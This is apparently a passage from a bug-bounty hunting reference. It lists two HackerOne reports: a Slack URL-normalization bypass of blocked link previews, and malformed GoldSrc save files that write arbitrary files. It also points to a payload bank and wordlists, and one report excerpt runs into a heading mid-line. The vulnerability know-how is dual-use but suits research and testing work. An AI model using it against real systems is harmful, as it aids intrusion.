- **Lack of URL normalization renders Blocked-Previews feature ineffectual** — `#1102764` · Slack · $1,000 · ▲100

  > with [Microsoft Outlook](https://hackerone.com/redirect?url=https%3A%2F%2Fslackhq.com%2Fincrease-everyday-productivity-with-office-365-apps-for-slack)).

- **Malformed save files (.sav) allow to write files with arbitrary extensions and content in GoldSrc-based games.** — `#458842` · Valve · $1,500 · ▲99

  > - sets the directory against which the engine will try to load the client library 'cl dlls/client.dll' into memory when restarted;## Probes

- Search the corpus by symptom, not by class name.

## Supporting data

- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
- `references/payloads.md` — curated payload bank + upstream payload references
- `references/wordlists/` — 2 mined paths/params/payload lists
- `bbhunt-methodology` — orchestrator, state machine and class router
